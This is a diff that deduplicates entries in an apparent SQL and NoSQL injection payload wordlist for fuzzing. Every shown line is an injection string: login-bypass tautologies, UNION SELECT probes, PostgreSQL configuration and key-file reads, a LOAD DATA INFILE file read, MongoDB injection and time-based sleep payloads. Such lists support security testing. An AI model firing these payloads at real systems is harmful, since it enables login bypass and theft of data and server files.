@@ -1,3 +1,4 @@
+1
 '-'
 ' '
 '&'
@@ -58,7 +59,6 @@ admin') or '1'='1'/*
 UNION ALL SELECT 
 'admin';--
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
-
 admin" --
 admin'#
 admin'--
@@ -96,7 +96,6 @@ admin") or "1"="1"/*
 "/*
 ' and 1='1
 ' and a='a
-or 1=1
 or true
 ' or ''='
 " or ""="
@@ -122,10 +121,6 @@ or 0=0 –
 " or 0=0 #
 " or 0=0 –
 %' or '0'='0
-or 1=1
-or 1=1--
-or 1=1/*
-or 1=1#
 or 1=1–
 ' or 1=1--
 ' or '1'='1
@@ -136,7 +131,6 @@ or 1=1–
 ' or 1=1
 ' or 1=1 --
 ' or 1=1 –
-' or 1=1--
 ' or 1=1;#
 ' or 1=1/*
 ' or 1=1#
@@ -196,9 +190,7 @@ or 1=1–
 ' or userid like '%
 ' or user like '%
 ' or username like '%
-' or 'x'='x
 ') or ('x'='x
-" or "x"="x
 ' OR 'x'='x'#;
 '=' 'or' and '=' 'or'
 ' UNION ALL SELECT 1, @@version;#
@@ -219,7 +211,6 @@ select current_setting('port');
 select current_setting('password_encryption');
 select current_setting('krb_server_keyfile');
 select current_setting('virtual_host');
-select current_setting('port');
 select current_setting('config_file');
 select current_setting('hba_file');
 select current_setting('data_directory');
@@ -234,13 +225,6 @@ create table myfile (input TEXT); load data infile '<filepath>' into table myfil
 <username>'--
 ' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
 'OR 1=1--
-create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
-<username>' OR 1=1--
-'OR '' = '
-<username>'--
-' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
-'OR 1=1--
-'OR '' = '
 select @@version
 select @@servernamee
 select @@microsoftversione
@@ -285,7 +269,6 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 ';sleep(5000);'
 ';sleep(5000);+'
 ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
-1
 1 and user_name() = 'dbo'
 \'; desc users; --
 1\'1
